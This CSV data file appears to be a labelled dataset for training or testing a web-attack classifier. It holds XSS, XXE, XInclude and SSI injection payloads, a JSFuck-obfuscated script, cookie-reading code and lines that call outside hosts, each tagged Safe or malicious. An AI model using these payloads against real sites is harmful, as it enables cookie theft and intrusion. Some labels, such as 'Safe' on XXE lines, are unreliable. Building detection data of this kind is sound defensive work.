"""string"",""classification"""
"""var=(selectextractvalue(xmltype('<?xmlversion=""""1.0""""encoding=""""UTF-8""""?><!DOCTYPEroot[<!ENTITY%anwynSYSTEM""""http://y98bkp2csupyyfz9cxk3wbxaj1pzuzi26vtohd.example'||'foo.bar/"""">%anwyn;"",""Safe"""
"""var=<vqkxmlns:xi=""""http://www.w3.org/2001/XInclude""""><xi:includehref=""""http://749kfyxln3k7toui76fcrksjeak3nybzzsmlaa.examplefoo.bar/foo""""/></vqk>"",""Safe"""
"""var=2010-01-01'||(selectextractvalue(xmltype('<?xmlversion=""""1.0""""encoding=""""UTF-8""""?><!DOCTYPEroot[<!ENTITY%fhkluSYSTEM""""http://fzisa6stibffowpq2eakmsnr9ifhii6mueh45t.example'||'foo.bar/"""">%fhklu;"",""Safe"""
"""/api/v1/query?q=7XMLNS"",""Safe"""
"var=<chj,""Safe"""
" xmlns=""""http://a.b/""""xmlns:xsi=""""http://www.w3.org/2001/XMLSchema-instance""""xsi:schemaLocation=""""http://a.b/http://1pre0sif8x51eifcs006ceddz45084w4kx7ovd.examplefoo.bar/chj.xsd"""">chj</chj>"",""Safe"""
"""9411400-1=<p style=""""background:url(javascript:alert(1))"""">"",""MaliciousIntended-but-safe"""
"""<p style=""""background:url(javascript:alert(1))"""">=941140-2"",""MaliciousIntended-but-safe"""
"""/bar"",""Safe"""
"""/bar?test=x=x:url(javascript"",""MaliciousIntended-but-safe"""
"""941150-1=<a href=""""test"""""",""Safe"""
"""payload=<ahref=#language=""""JScript.Encode""""onclick=""""#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@"""" >XSS</a>"",""MaliciousIntended-but-safe"""
"""/char_test?mime=text/xml&body=<x onend="",""MaliciousIntended-but-safe"""
"""/char_test?mime=text/xml&body=""""onzoom="",""MaliciousIntended-but-safe"""
"""/char_test?mime=text/xml&body='formaction="",""MaliciousIntended-but-safe"""
"""/char_test?mime=text/xml&body=< x: script"",""MaliciousIntended-but-safe"""
"""/char_test?mime=text/xml&body=$<f o r m"",""MaliciousIntended-but-safe"""
"""/?foo<f o r m=bar"",""MaliciousIntended-but-safe"""
"""/?foo=bar<f o r m"",""MaliciousIntended-but-safe"""
"""var='""""><svg/onload=(new(Image)).src='//m8vzjd10riomx3yxblmcnvaskjghsdz8xorciu7\56coreruleset.org'>"",""Malicious-unsafe"""
"""/get?mime=text/xml&body=$<d i a l o g"",""MaliciousIntended-but-safe"""
"""payload=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""""/+/onmouseover=1/+/[*/[]/+alert(1)//'></a>"",""Malicious-unsafe"""
"""/?var=javascript: \\\\t"",""MaliciousIntended-but-safe"""
"""/?var=javascript:\\\\u0020"",""MaliciousIntended-but-safe"""
"""/?test= data: , <x>"",""Safe"""
"""941180-1=window.location"",""Safe"""
"""document.cookie=941180-2"",""Safe"""
"""941180-4=-->"",""Safe"""
"""var=""""-->'-->`--><!--#setvar=""""qjr9""""value=""""kjkjg7sdk""""--><!--#setvar=""""fqz7""""value=""""sql4xxaq""""--><!--#echovar=""""qjr9""""--><!--#echovar=""""fq4p""""-->"""""",""Safe"""
"""arg=...(document.domain)..."",""Safe"""
"""/javascript-manual/document.cookie"",""Safe"""
"""941181-1=-->"",""Safe"""
"""""-->""""=941181-3"",""Safe"""
"""/baz"",""Safe"""
"""941190-1=<STYLE>@import'http://xss.rocks/xss.css';</STYLE>"",""Safe"""
"""x=<STYLE>@im\\port'\\jaasc\\ript:alert('XSS')';</STYLE>"",""MaliciousIntended-but-safe"""
"""941200-1=<v:vmlframe src=""""foo.com/sup.fml""""/>"",""Safe"""
"""<v:vmlframe src=""""foo.com/sup.fml""""/>=941200-2"",""Safe"""
"""941210-1=ja&tab;vascript: "",""Malicious-unsafe"""
"""ja&tab;vascript:       =941210-2"",""Malicious-unsafe"""
"""{""""url"""":""""javascript&#10:alert(7)""""}"",""Malicious-unsafe"""
"""{""""url"""":""""jav&#13ascript:alert(7)""""}"",""Malicious-unsafe"""
"""var=v&newline;b&tab;s&newline;c&newline;r&tab;i&tab;p&newline;t&colon;:&var2=whatever"",""MaliciousIntended-but-safe"""
"""payload=<ahref=""""vbscript:MsgBox+1"""">XSS</a>"",""MaliciousIntended-but-safe"""
"""var=<embedsrc=""""deuce.swf"""">&var2=whatever"",""Safe"""
"""payload=<embedsrc=""""javascript:alert(1)""""></a>"",""MaliciousIntended-but-safe"""
"""/?var=<?import implementation ="",""MaliciousIntended-but-safe"""
"""/?test=<importimplementation="",""MaliciousIntended-but-safe"""
"""var=<metahttp-equiv=""""refresh""""&foo=var"",""MaliciousIntended-but-safe"""
"""payload=<metahttp-equiv=""""refresh""""content=""""0;http://evil?</a>"",""Safe"""
"""var=<metacharset=""""UTF-8"""">&var2=whatever"",""Safe"""
"""payload=<metacharset=""""UTF-7""""/>+ADw-script+AD4-alert(1)+ADw-/script+AD4-</a>"",""MaliciousIntended-but-safe"""
"""/?var=<link / asdf href  /= "",""Safe"""
"""payload=<linkhref=""""xss.js""""rel=stylesheettype=""""text/javascript""""></a>"",""MaliciousIntended-but-safe"""
"""/?var=<BASE dsfds HREF / ="",""Safe"""
"""payload=<ahref=abcstyle=""""width:101%;height:100%;position:absolute;font-size:1000px;"""">xss<basehref=""""//evil/</a>"",""Safe"""
"""var=<appletcode=""""deuce.class"""">&var=whatever"",""Safe"""
"""payload=<appletonreadystatechange=alert(1)></applet></a>"",""MaliciousIntended-but-safe"""
"""/?<OBJECT data ==sdffdsa"",""Safe"""
"""payload=<objectdata=""""javascript:alert(1)""""></a>"",""MaliciousIntended-but-safe"""
"""var=\\xbcscript\\xbealert(\\xa2XSS\\xa2)\\xbc/script\\xbe"",""MaliciousIntended-but-safe"""
"""var=\\xc2\\xbcscript\\xc2\\xbealert(\\xc2\\xa2XSS\\xc2\\xa2)\\xc2\\xbc/script\\xc2\\xbe"",""MaliciousIntended-but-safe"""
"""var=\\xd0\\xbcscript\\xd0\\xbealert(\\xc2\\xa2XSS\\xc2\\xa2)\\xd0\\xbc/script\\xd0\\xbe"",""MaliciousIntended-but-safe"""
"""var=\\xd0\\xb0\\xd0\\xb1\\xd0\\xb2\\xd0\\xb3\\xd0\\xb4\\xd0\\xb5\\xd1\\x91\\xd0\\xb6\\xd0\\xb7\\xd0\\xb8\\xd0\\xb9\\xd0\\xba\\xd0\\xbb\\xd0\\xbc\\xd0\\xbd\\xd0\\xbe\\xd0\\xbf\\xd1\\x80\\xd1\\x81\\xd1\\x82\\xd1\\x83\\xd1\\x84\\xd1\\x85\\xd1\\x86\\xd1\\x87\\xd1\\x88\\xd1\\x89\\xd1\\x8a\\xd1\\x8b\\xd1\\x8d\\xd1\\x8e\\xd1\\x8f"",""Safe"""
"""var=de_matten&sitzbez\\xc3\\x83\\xc2\\xbcge>fu\\xc3\\x83\\xc2\\x9fmatten_mt"",""Safe"""
"""var=\\xbc\\xbc"",""Safe"""
"""var=\\xbe\\xbe"",""Safe"""
"""var=\\xd0\\xbcscript\\xd0\\xbealert(\\xc2\\xa2XSS\\xc2\\xa2)\\xd0\\xbc/script\\xd0"",""MaliciousIntended-but-safe"""
"""var=\\xd0\\xbcscript\\xd0\\xbealert(\\xc2\\xa2XSS\\xc2\\xa2)\\xd0/script\\xd0\\xbe"",""MaliciousIntended-but-safe"""
"""var=\\xd0\\xb0\\xd0\\xb1\\xd0\\xb2\\xd0\\xb3\\xd0\\xb4\\xd0\\xb5\\xd1\\x91\\xd0\\xb6\\xd0\\xb7\\xd0\\xb8\\xd0\\xb9\\xd0\\xba\\xd0\\xbb\\xd0\\xbc\\xd0\\xbd\\xd0\\xbf\\xd1\\x80\\xd1\\x81\\xd1\\x82\\xd1\\x83\\xd1\\x84\\xd1\\x85\\xd1\\x86\\xd1\\x87\\xd1\\x88\\xd1\\x89\\xd1\\x8a\\xd1\\x8b\\xd1\\x8d\\xd1\\x8e\\xd1\\x8f"",""Safe"""
"""var=\\xd0\\xb0\\xd0\\xb1\\xd0\\xb2\\xd0\\xb3\\xd0\\xb4\\xd0\\xb5\\xd1\\x91\\xd0\\xb6\\xd0\\xb7\\xd0\\xb8\\xd0\\xb9\\xd0\\xba\\xd0\\xbb\\xd0\\xbd\\xd0\\xbe\\xd0\\xbf\\xd1\\x80\\xd1\\x81\\xd1\\x82\\xd1\\x83\\xd1\\x84\\xd1\\x85\\xd1\\x86\\xd1\\x87\\xd1\\x88\\xd1\\x89\\xd1\\x8a\\xd1\\x8b\\xd1\\x8d\\xd1\\x8e\\xd1\\x8f"",""Safe"""
"""test=\\xbctest\\xbetest(\\xa2XSS\\xa2)\\xbc/test\\xbe"",""MaliciousIntended-but-safe"""
"""var=<noscript#"",""MaliciousIntended-but-safe"""
"""/?var=""""in \\u0076\\u0061l\\u0075e\\u004F\\u0066="",""Safe"""
"""payload=<iframesrcdoc=""""<imgsrc=1onerror=alert(1)>""""></iframe></a>"",""Malicious-unsafe"""
"""var='infoo.bar=&var2=whatever"",""Safe"""
"""/xx?id=%2bADw-script%2bAD4-"",""MaliciousIntended-but-safe"""
"""a=[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()"",""Malicious-unsafe"""
"""a=(![]+[])[+!+[]]"",""Safe"""
"""a=+!![]"",""Safe"""
"""a=document+/*foo*/+.+++++cookie"",""MaliciousIntended-but-safe"""
"""a=document/*foo*/./*bar*/cookie"",""MaliciousIntended-but-safe"""
"""a=window[""""alert""""](window[""""document""""][""""cookie""""])"",""Malicious-unsafe"""
"""a=self[/*foo*/""""alert""""](self[""""document""""/*bar*/][""""cookie""""])"",""Malicious-unsafe"""
"""a=self++/*jhb*/++[++/*bar*/++""""alert""""](""""xss"""")"",""MaliciousIntended-but-safe"""
"""a=self[""""$""""][""""globalEval""""](""""alert(1)"""")"",""MaliciousIntended-but-safe"""
"""a=self[""""\x24""""]"",""Safe"""
"""a=(document)[""""cookie""""]"",""Safe"""
"""a=(document/*foo*/)[""""cookie""""]"",""Safe"""
"""/login?user= x {{constructor.constructor('alert(1)')()}} . ff"",""MaliciousIntended-but-safe"""
"""/?arg=setInterval(code, 1)"",""MaliciousIntended-but-safe"""
"""/?arg=x"""";setTimeout(name, 1)//"",""Malicious-unsafe"""
"""/?arg=eval('2 + 2')"",""Malicious-unsafe"""
"""/?arg=new Function()"",""MaliciousIntended-but-safe"""
"""/?arg=alert()"",""Malicious-unsafe"""
"""/?arg=atob()"",""Safe"""
"""/?arg=btoa()"",""Safe"""
"""/get?arg=prompt()"",""Malicious-unsafe"""
"""/get?arg=confirm()"",""Malicious-unsafe"""
"""/?xss=[].sort.call`${alert}1337`"",""MaliciousIntended-but-safe"""
"""/?xss=[  ] . sort . call ` ${ alert } 1337 `"",""MaliciousIntended-but-safe"""
"""/?xss=[  ] . /**/ sort . call ` ${ alert } 1337 `"",""MaliciousIntended-but-safe"""
"""/?xss=[].map.call`${eval}\\u{61}lert\x281337\x29`"",""MaliciousIntended-but-safe"""
"""/?xss=[ 1234 ]. map . call`${eval}/* asd */\\u{61}lert\x281337\x29`"",""MaliciousIntended-but-safe"""
"""/?xss=Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`"",""MaliciousIntended-but-safe"""
"""/?test=Reflect.sort.call``"",""MaliciousIntended-but-safe"""
